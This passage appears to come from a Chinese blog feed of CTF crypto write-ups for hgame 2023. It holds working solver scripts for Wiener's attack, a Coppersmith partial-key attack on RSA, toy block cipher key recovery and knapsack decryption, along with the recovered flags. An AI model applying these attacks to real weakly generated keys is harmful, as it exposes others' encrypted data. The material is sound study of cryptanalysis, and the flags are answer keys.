function_">t_cf</span>(<span class="params">n, d</span>):  <span class="comment"># 将分数 x/y 转为连分数的形式</span></span><br><span class="line">    res = []</span><br><span class="line">    <span class="keyword">while</span> d:</span><br><span class="line">        res.append(n // d)</span><br><span class="line">        n, d = d, n % d</span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">cf</span>(<span class="params">sub_res</span>):  <span class="comment"># 得到渐进分数的分母和分子</span></span><br><span class="line">    n, d = <span class="number">1</span>, <span class="number">0</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> sub_res[::-<span class="number">1</span>]:  <span class="comment"># 从后面往前循环</span></span><br><span class="line">        d, n = n, i * n + d</span><br><span class="line">    <span class="keyword">return</span> d, n</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">list_fraction</span>(<span class="params">x, y</span>):  <span class="comment"># 列出每个渐进分数</span></span><br><span class="line">    res = t_cf(x, y)</span><br><span class="line">    res = <span class="built_in">list</span>(<span class="built_in">map</span>(cf, (res[<span class="number">0</span>:i] <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="built_in">len</span>(res)))))  <span class="comment"># 将连分数的结果逐一截取以求渐进分数</span></span><br><span class="line">    <span class="keyword">return</span> res</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">get_pq</span>(<span class="params">a, b, c</span>):  <span class="comment"># 由p+q和pq的值通过维达定理来求解p和q(解二元一次方程)</span></span><br><span class="line">    par = gmpy2.isqrt(b * b - <span class="number">4</span> * a * c)  <span class="comment"># 由上述可得，开根号一定是整数，因为有解</span></span><br><span class="line">    x1, x2 = (-b + par) // (<span class="number">2</span> * a), (-b - par) // (<span class="number">2</span> * a)</span><br><span class="line">    <span class="keyword">return</span> x1, x2</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">wienerAttack</span>(<span class="params">e, n</span>):</span><br><span class="line">    <span class="keyword">for</span> (d, k) <span class="keyword">in</span> list_fraction(e, n):  <span class="comment"># 用一个for循环来注意试探e/n的连续函数的渐进分数，直到找到一个满足条件的渐进分数</span></span><br><span class="line">        <span class="keyword">if</span> k == <span class="number">0</span>:  <span class="comment"># 可能会出现连分数的第一个为0的情况，排除</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        <span class="keyword">if</span> (e * d - <span class="number">1</span>) % k != <span class="number">0</span>:  <span class="comment"># ed=1 (mod φ(n)) 因此如果找到了d的话，(ed-1)会整除φ(n),也就是存在k使得(e*d-1)//k=φ(n)</span></span><br><span class="line">            <span class="keyword">continue</span></span><br><span class="line">        phi = (e * d - <span class="number">1</span>) // k  <span class="comment"># 这个结果就是 φ(n)</span></span><br><span class="line">        px, qy = get_pq(<span class="number">1</span>, n - phi + <span class="number">1</span>, n)</span><br><span class="line">        <span class="keyword">if</span> px * qy == n:</span><br><span class="line">            p, q = <span class="built_in">abs</span>(<span class="built_in">int</span>(px)), <span class="built_in">abs</span>(<span class="built_in">int</span>(qy))  <span class="comment"># 可能会得到两个负数，负负得正未尝不会出现</span></span><br><span class="line">            d = gmpy2.invert(e, (p - <span class="number">1</span>) * (q - <span class="number">1</span>))  <span class="comment"># 求ed=1 (mod  φ(n))的结果，也就是e关于 φ(n)的乘法逆元d</span></span><br><span class="line">            <span class="keyword">return</span> d</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;求解d失败&quot;</span>)</span><br><span class="line">d = wienerAttack(e, n)</span><br><span class="line">m = <span class="built_in">pow</span>(c,d,n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(m))</span><br><span class="line"></span><br><span class="line"><span class="comment">#b&#x27;wiener_attack_easily!!!&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="第二关"><a href="#第二关" class="headerlink" title="第二关"></a>第二关</h3><p>n可分解，但是e与phi不互素，阅读代码<code>GCD(e, phi) == 2</code>可知当e约去公约数后与phi互素，</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="comment"># 当e约去公约数后与phi互素</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">decrypt</span>(<span class="params">p, q, e, c</span>):</span><br><span class="line">    n = p * q</span><br><span class="line">    phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">    t = gmpy2.gcd(e, phi)</span><br><span class="line">    d = gmpy2.invert(e // t, phi)</span><br><span class="line">    m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line">    <span class="built_in">print</span>(m)</span><br><span class="line">    msg = gmpy2.iroot(m, t)</span><br><span class="line">    <span class="built_in">print</span>(msg)</span><br><span class="line">    <span class="keyword">if</span> msg[<span class="number">1</span>]:</span><br><span class="line">        <span class="built_in">print</span>(long_to_bytes(msg[<span class="number">0</span>]))</span><br><span class="line"></span><br><span class="line">n = <span class="number">122381064468541126309718086861386213053498636179340572125610169956232582086739576947540896059319981504449407200502594019968920620235252211697442740346038386304378393494454340455213050021135140464724058611080834827228835351375946070650752536167883326766512859940200475016000340021173670911226891899651853227203</span></span><br><span class="line">e = <span class="number">47570</span></span><br><span class="line">c=<span class="number">0x59f3ad998a504b9a708c7ec8f1a90864b8f95aa3f778dc1dbfc43c5f9199309024d654397104f058de8e481a4af094f13e9b280d86458a9fda8a495cd1bb7fa0a20cac3871b7647d676b839d6192f9668052cb72de67c6044d4f945bbac7eabff7f2cad94224836ae0c12591640a8d4a7f742afb3d7e4498651f42060d09bb64</span></span><br><span class="line">p=<span class="number">11062597546170660831598915410004023104367207896542748829455588895854027142737404881020501402873695330720251012201822058413834474857042235319981907021927899</span></span><br><span class="line">q=<span class="number">11062597546170660831598915410004023104367207896542748829455588895854027142737316863487588881898407300039289058538314140903757507505663179773397400197879097</span></span><br><span class="line"></span><br><span class="line">decrypt(p, q, e, c)</span><br></pre></td></tr></table></figure><h3 id="第三关"><a href="#第三关" class="headerlink" title="第三关"></a>第三关</h3><p>已知 p高位攻击，但泄露位数过少，根据提示可以调节small_roots参数扩大格范围并爆破</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> tqdm <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line">n = <span class="number">68340867186438223292118569682710524595966327481168801678255800028919163918249557519447553078528255888326840419621716908729880235244230459900539486879943421761586611726942757775742624070088176246368128990077459966006579285028594729801017390816903003704541109757846868073362640037019813128220657114558520107057</span></span><br><span class="line">e = <span class="number">65537</span></span><br><span class="line">c = <span class="number">0x29d543c73f4175f22440eef5954184e9d740cd3785011d560431861ccf6c4ff380d46ad948f9888e8cac2f5e38ce5e994f023d7195b78439b90d53ad23a730cc99b1b75dae1aba416cb6e645c5d135de906be54f344daba47a10492183d03211bfbaa45c09be2bb1913b1453e0538db95c56140cb78dd9c43d21f8312245ef7d</span></span><br><span class="line">pbits = <span class="number">512</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> trange(<span class="number">2</span>**<span class="number">6</span>):</span><br><span class="line">    p4 = <span class="number">531320819410375258952658395582915285878636410772332266245849790153420724865787</span> &lt;&lt; (<span class="number">253</span> - <span class="number">248</span>)</span><br><span class="line">    p4 = p4 + i</span><br><span class="line">    kbits = pbits - p4.nbits()</span><br><span class="line">    p4 = p4 &lt;&lt; kbits</span><br><span class="line">    PR.&lt;x&gt;= PolynomialRing(Zmod(n))</span><br><span class="line">    f = x + p4</span><br><span class="line">    roots = f.small_roots(X=<span class="number">2</span> ^ kbits, beta=<span class="number">0.4</span>, epsilon=<span class="number">0.01</span>)</span><br><span class="line">    <span class="keyword">if</span> roots:</span><br><span class="line">        p = p4 + <span class="built_in">int</span>(roots[<span class="number">0</span>])</span><br><span class="line">        <span class="keyword">if</span> n % p == <span class="number">0</span>:</span><br><span class="line">            <span class="built_in">print</span>(i, p)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">q = n // p</span><br><span class="line">phi = (p - <span class="number">1</span>) * (q - <span class="number">1</span>)</span><br><span class="line">d = inverse_mod(e, phi)</span><br><span class="line">m = <span class="built_in">pow</span>(c, d, n)</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(m)))</span><br><span class="line"><span class="comment"># b&#x27;now_you_know_how_to_use_coppersmith&#x27;</span></span><br></pre></td></tr></table></figure><h1 id="ezBlock（复现）"><a href="#ezBlock（复现）" class="headerlink" title="ezBlock（复现）"></a>ezBlock（复现）</h1><h2 id="题目-2"><a href="#题目-2" class="headerlink" title="题目"></a>题目</h2><p>描述：兔兔拜年的时候遇到了 yolande ，yolande 说她之前在写差分攻击脚本，问兔兔要不要学习一下，还说如果遇到问题可以看看 The Block Cipher Companion.</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">s_substitute</span>(<span class="params">m</span>):</span><br><span class="line">    c = <span class="number">0</span></span><br><span class="line">    s_box = &#123;<span class="number">0</span>: <span class="number">0x6</span>, <span class="number">1</span>: <span class="number">0x4</span>, <span class="number">2</span>: <span class="number">0xc</span>, <span class="number">3</span>: <span class="number">0x5</span>, <span class="number">4</span>: <span class="number">0x0</span>, <span class="number">5</span>: <span class="number">0x7</span>, <span class="number">6</span>: <span class="number">0x2</span>, <span class="number">7</span>: <span class="number">0xe</span>, <span class="number">8</span>: <span class="number">0x1</span>, <span class="number">9</span>: <span class="number">0xf</span>, <span class="number">10</span>: <span class="number">0x3</span>, <span class="number">11</span>: <span class="number">0xd</span>, <span class="number">12</span>: <span class="number">0x8</span>,</span><br><span class="line">             <span class="number">13</span>: <span class="number">0xa</span>, <span class="number">14</span>: <span class="number">0x9</span>, <span class="number">15</span>: <span class="number">0xb</span>&#125;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">0</span>, <span class="number">16</span>, <span class="number">4</span>):</span><br><span class="line">        t = (m &gt;&gt; i) &amp; <span class="number">0xf</span></span><br><span class="line">        t = s_box[t]</span><br><span class="line">        c += t &lt;&lt; i</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">enc</span>(<span class="params">m, key</span>):</span><br><span class="line">    n = <span class="built_in">len</span>(key)</span><br><span class="line">    t = m</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(n - <span class="number">1</span>):</span><br><span class="line">        t = t ^ key[i]</span><br><span class="line">        t = s_substitute(t)</span><br><span class="line">    c = t ^ key[n - <span class="number">1</span>]</span><br><span class="line">    <span class="keyword">return</span> c</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">f = flag[<span class="number">6</span>:-<span class="number">1</span>]</span><br><span class="line"><span class="keyword">assert</span> flag == <span class="string">&#x27;hgame&#123;&#x27;</span> + f + <span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line">key = [<span class="built_in">int</span>(i, <span class="number">16</span>) <span class="keyword">for</span> i <span class="keyword">in</span> f.split(<span class="string">&#x27;_&#x27;</span>)]</span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(key))</span><br><span class="line">m_list = [i * <span class="number">0x1111</span> <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>)]</span><br><span class="line">c_list = [enc(m, key) <span class="keyword">for</span> m <span class="keyword">in</span> m_list]</span><br><span class="line"><span class="built_in">print</span>(c_list)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 5</span></span><br><span class="line"><span class="comment"># [28590, 33943, 30267, 5412, 11529, 3089, 46924, 59533, 12915, 37743, 64090, 53680, 18933, 49378, 23512, 44742]</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="解决方法-2"><a href="#解决方法-2" class="headerlink" title="解决方法"></a>解决方法</h2><p>没看懂，等理解后再更新</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><span class="line">m_list = [<span class="built_in">hex</span>(i * <span class="number">0x1111</span>)[<span class="number">2</span>:].rjust(<span class="number">4</span>, <span class="string">&#x27;0&#x27;</span>) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>)]</span><br><span class="line">c_list = [<span class="number">28590</span>, <span class="number">33943</span>, <span class="number">30267</span>, <span class="number">5412</span>, <span class="number">11529</span>, <span class="number">3089</span>, <span class="number">46924</span>, <span class="number">59533</span>, <span class="number">12915</span>, <span class="number">37743</span>, <span class="number">64090</span>, <span class="number">53680</span>, <span class="number">18933</span>, <span class="number">49378</span>, <span class="number">23512</span>, <span class="number">44742</span>]</span><br><span class="line">c_list = [<span class="built_in">hex</span>(i)[<span class="number">2</span>:].rjust(<span class="number">4</span>, <span class="string">&#x27;0&#x27;</span>) <span class="keyword">for</span> i <span class="keyword">in</span> c_list]</span><br><span class="line">s_box = &#123;<span class="number">0</span>: <span class="number">0x6</span>, <span class="number">1</span>: <span class="number">0x4</span>, <span class="number">2</span>: <span class="number">0xc</span>, <span class="number">3</span>: <span class="number">0x5</span>, <span class="number">4</span>: <span class="number">0x0</span>, <span class="number">5</span>: <span class="number">0x7</span>, <span class="number">6</span>: <span class="number">0x2</span>, <span class="number">7</span>: <span class="number">0xe</span>, <span class="number">8</span>: <span class="number">0x1</span>, <span class="number">9</span>: <span class="number">0xf</span>, <span class="number">10</span>: <span class="number">0x3</span>, <span class="number">11</span>: <span class="number">0xd</span>, <span class="number">12</span>: <span class="number">0x8</span>, <span class="number">13</span>: <span class="number">0xa</span>, <span class="number">14</span>: <span class="number">0x9</span>, <span class="number">15</span>: <span class="number">0xb</span>&#125;</span><br><span class="line">ans = []</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">    t = &#123;&#125;</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        t[<span class="built_in">int</span>(m_list[i][k], <span class="number">16</span>)] = <span class="built_in">int</span>(c_list[i][k], <span class="number">16</span>)</span><br><span class="line">    <span class="keyword">for</span> a <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">        <span class="keyword">for</span> b <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">            <span class="keyword">for</span> c <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">                <span class="keyword">for</span> d <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">                    <span class="keyword">for</span> e <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">                        key = [a,b,c,d,e]</span><br><span class="line">                        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">16</span>):</span><br><span class="line">                            m = i</span><br><span class="line">                            <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">4</span>):</span><br><span class="line">                                m = m ^ key[j]</span><br><span class="line">                                m = s_box[m]</span><br><span class="line">                            m = m ^ key[<span class="number">4</span>]</span><br><span class="line">                            <span class="keyword">if</span> m != t[i]:</span><br><span class="line">                                <span class="keyword">break</span></span><br><span class="line">                            <span class="keyword">elif</span> i==<span class="number">15</span>:</span><br><span class="line">                                ans.append(key)</span><br><span class="line"><span class="built_in">print</span>(ans)</span><br><span class="line">key = [<span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>, <span class="number">0</span>]</span><br><span class="line"><span class="keyword">for</span> k <span class="keyword">in</span> ans:</span><br><span class="line">    key = [(key[i]*<span class="number">16</span>+k[i]) <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">5</span>)]</span><br><span class="line"><span class="built_in">print</span>([<span class="built_in">hex</span>(i) <span class="keyword">for</span> i <span class="keyword">in</span> key])</span><br><span class="line">flag = <span class="string">&#x27;hgame&#123;&#x27;</span> + <span class="built_in">hex</span>(key[<span class="number">0</span>])[<span class="number">2</span>:] + <span class="string">&#x27;_&#x27;</span> + <span class="built_in">hex</span>(key[<span class="number">1</span>])[<span class="number">2</span>:] + <span class="string">&#x27;_&#x27;</span> + <span class="built_in">hex</span>(key[<span class="number">2</span>])[<span class="number">2</span>:] + <span class="string">&#x27;_&#x27;</span> + <span class="built_in">hex</span>(key[<span class="number">3</span>])[<span class="number">2</span>:] + <span class="string">&#x27;_&#x27;</span> + <span class="built_in">hex</span>(key[<span class="number">4</span>])[<span class="number">2</span>:] + <span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line"><span class="built_in">print</span>(flag)</span><br><span class="line"><span class="comment">#[[4, 15, 4, 4, 13], [15, 4, 15, 5, 8], [4, 9, 9, 7, 13], [2, 3, 2, 0, 5]]</span></span><br><span class="line"><span class="comment">#[&#x27;0x4f42&#x27;, &#x27;0xf493&#x27;, &#x27;0x4f92&#x27;, &#x27;0x4570&#x27;, &#x27;0xd8d5&#x27;]</span></span><br><span class="line"><span class="comment">#hgame&#123;4f42_f493_4f92_4570_d8d5&#125;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>参考文章：</p><p><a href="https://www.cnblogs.com/App1eTree/#/c/subject/p/2023hgame.html">App1e_Tree - 博客园 (cnblogs.com)</a></p>]]></content>
      
      
      <categories>
          
          <category> crypto </category>
          
          <category> ctf wp </category>
          
      </categories>
      
      
        <tags>
            
            <tag> ctf </tag>
            
            <tag> match </tag>
            
            <tag> crypto </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2023 hgame week2 Crypto篇部分wp</title>
      <link href="/2023/01/21/2023%20hgame%20week2%20Crypto%E7%AF%87wp/"/>
      <url>/2023/01/21/2023%20hgame%20week2%20Crypto%E7%AF%87wp/</url>
      
        <content type="html"><![CDATA[<h1 id="包里有什么"><a href="#包里有什么" class="headerlink" title="包里有什么"></a>包里有什么</h1><h2 id="描述"><a href="#描述" class="headerlink" title="描述"></a>描述</h2><blockquote><p>兔兔收到了一包年货，但是他忘了里面有什么了。</p></blockquote><h2 id="题目"><a href="#题目" class="headerlink" title="题目"></a>题目</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> random <span class="keyword">import</span> randint</span><br><span class="line"><span class="keyword">from</span> libnum <span class="keyword">import</span> gcd, s2n</span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> secret <span class="keyword">import</span> flag</span><br><span class="line"></span><br><span class="line">plain = flag[<span class="number">6</span>:-<span class="number">1</span>]</span><br><span class="line"><span class="keyword">assert</span> flag == <span class="string">&#x27;hgame&#123;&#x27;</span> + plain + <span class="string">&#x27;&#125;&#x27;</span></span><br><span class="line">v = <span class="built_in">bin</span>(s2n(plain))[<span class="number">2</span>:]</span><br><span class="line">l = <span class="built_in">len</span>(v)</span><br><span class="line">a = [<span class="number">2</span> &lt;&lt; i <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(l)]</span><br><span class="line">m = randint(<span class="built_in">sum</span>(a), <span class="number">2</span> &lt;&lt; l + <span class="number">1</span>)</span><br><span class="line">w = randint(<span class="number">0</span>, m)</span><br><span class="line"><span class="keyword">assert</span> gcd(w, m) == <span class="number">1</span></span><br><span class="line">b = [w * i % m <span class="keyword">for</span> i <span class="keyword">in</span> a]</span><br><span class="line"></span><br><span class="line">c = <span class="number">0</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(l):</span><br><span class="line">    c += b[i] * <span class="built_in">int</span>(v[i])</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;m = <span class="subst">&#123;m&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;b0 = <span class="subst">&#123;b[<span class="number">0</span>]&#125;</span>&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&#x27;c = <span class="subst">&#123;c&#125;</span>&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># m = 1528637222531038332958694965114330415773896571891017629493424</span></span><br><span class="line"><span class="comment"># b0 = 69356606533325456520968776034730214585110536932989313137926</span></span><br><span class="line"><span class="comment"># c = 93602062133487361151420753057739397161734651609786598765462162</span></span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="解决方法"><a href="#解决方法" class="headerlink" title="解决方法"></a>解决方法</h2><p>题⽬是⼀个背包加密，只要有 m, w, a 就可以解。</p><p>通过题目代码，我们可以知道：</p><blockquote><p>m、b0、c已知<br>a数组包含了2至2^l的所有数（l为字符串长度）<br>m是sum(a)至2^(l+1)之间的一个随机数<br>w是0至m之间的随机数</p></blockquote><p>通过<code>b = [w * i % m for i in a]</code>，再加上一些约束条件，我们可以获取w</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">m = <span class="number">1528637222531038332958694965114330415773896571891017629493424</span></span><br><span class="line">b0 = <span class="number">69356606533325456520968776034730214585110536932989313137926</span></span><br><span class="line">c = <span class="number">93602062133487361151420753057739397161734651609786598765462162</span></span><br><span class="line"><span class="comment">#获取w</span></span><br><span class="line">k = <span class="number">0</span></span><br><span class="line"><span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">    w = (b0 + k * m)</span><br><span class="line">    <span class="keyword">if</span> w // <span class="number">2</span> &gt; m:</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line">    <span class="keyword">if</span> w % <span class="number">2</span> == <span class="number">0</span>:</span><br><span class="line">        <span class="built_in">print</span>(w // <span class="number">2</span>)</span><br><span class="line">    k += <span class="number">1</span></span><br><span class="line">    </span><br><span class="line"><span class="comment">#34678303266662728260484388017365107292555268466494656568963</span></span><br><span class="line"><span class="comment">#798996914532181894739831870574530315179503554412003471315675</span></span><br></pre></td></tr></table></figure><p>求出w之后即可求出w的逆元并进行解密</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">w=<span class="number">34678303266662728260484388017365107292555268466494656568963</span></span><br><span class="line">w_=invert(w,m)</span><br><span class="line">v = c * w_ % m</span><br></pre></td></tr></table></figure><p>但是由于本题的构造问题，所以我们还需要将v以二进制的形式逆序处理</p><p>完整代码：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> long_to_bytes</span><br><span class="line"><span class="keyword">from</span> gmpy2 <span class="keyword">import</span> invert</span><br><span class="line"></span><br><span class="line">m = <span class="number">1528637222531038332958694965114330415773896571891017629493424</span></span><br><span class="line">b0 = <span class="number">69356606533325456520968776034730214585110536932989313137926</span></span><br><span class="line">c = <span class="number">93602062133487361151420753057739397161734651609786598765462162</span></span><br><span class="line"><span class="comment"># # get W</span></span><br><span class="line"><span class="comment"># k = 0</span></span><br><span class="line"><span class="comment"># while True:</span></span><br><span class="line"><span class="comment">#     w = (b0 + k * m)</span></span><br><span class="line"><span class="comment">#     if w // 2 &gt; m:</span></span><br><span class="line"><span class="comment">#         break</span></span><br><span class="line"><span class="comment">#     if w % 2 == 0:</span></span><br><span class="line"><span class="comment">#         print(w // 2)</span></span><br><span class="line"><span class="comment">#     k += 1</span></span><br><span class="line"></span><br><span class="line">w=<span class="number">34678303266662728260484388017365107292555268466494656568963</span></span><br><span class="line">w_=invert(w,m)</span><br><span class="line">v = c * w_ % m</span><br><span class="line"><span class="built_in">print</span>(long_to_bytes(<span class="built_in">int</span>(<span class="built_in">bin</span>(v)[<span class="number">2</span>:][::-<span class="number">1</span>], <span class="number">2</span>)))</span><br></pre></td></tr></table></figure><h1 id="rabin"><a href="#rabin" class="headerlink" title="rabin"></a>rabin</h1><h2 id="题目-1"><a href="#题目-1" class="headerlink" title="题目"></a>题目</h2><p>描述：</p><blockquote><p>看起来非常像RSA呢。</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">&gt;<span class="keyword">from</span> Crypto.Util.number <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">gen_key</span>(<span class="params">kbits</span>):</span><br><span class="line">    <span class="keyword">while</span> <span class="literal">True</span>:</span><br><span class="line">        p = getPrime(kbits)</span><br><span class="line">        q = getPrime(kbits)</span><br><span class="line">        <span class="keyword">if</span> p % <span class="number">4</span> == <span class="number">3</span> <span class="keyword">and</span> q % <span 